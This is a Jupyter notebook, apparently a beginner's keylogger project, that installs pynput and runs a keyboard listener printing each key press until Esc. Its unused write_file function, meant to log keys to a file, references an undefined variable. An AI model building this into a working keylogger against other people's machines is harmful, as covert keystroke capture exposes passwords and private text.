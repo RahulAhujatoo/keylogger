{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "d116fd4d",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'pyinput'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[1;32m~\\AppData\\Local\\Temp/ipykernel_13956/326795234.py\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mimport\u001b[0m \u001b[0mpyinput\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'pyinput'"
     ]
    }
   ],
   "source": [
    "import pyinput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "e2ca30f0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.6-py2.py3-none-any.whl (89 kB)\n",
      "Requirement already satisfied: six in d:\\anaconda\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.6\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "06bd0c88",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "3cb9fe89",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'e' pressed\n",
      "'r' pressed\n",
      "Key.esc pressed\n"
     ]
    }
   ],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "count = 0 \n",
    "key = []\n",
    "\n",
    "def write_file():\n",
    "    with open(\"log.txt\", \"a\") as f:\n",
    "        for key in keys:\n",
    "            f.write(key)\n",
    "\n",
    "def on_press(key):\n",
    "    print(\"{0} pressed\".format(key))\n",
    "    \n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False\n",
    "    \n",
    "\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n"
   ]
  },
  {
   "cell_type": "raw",
   "id": "7df3d23c",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
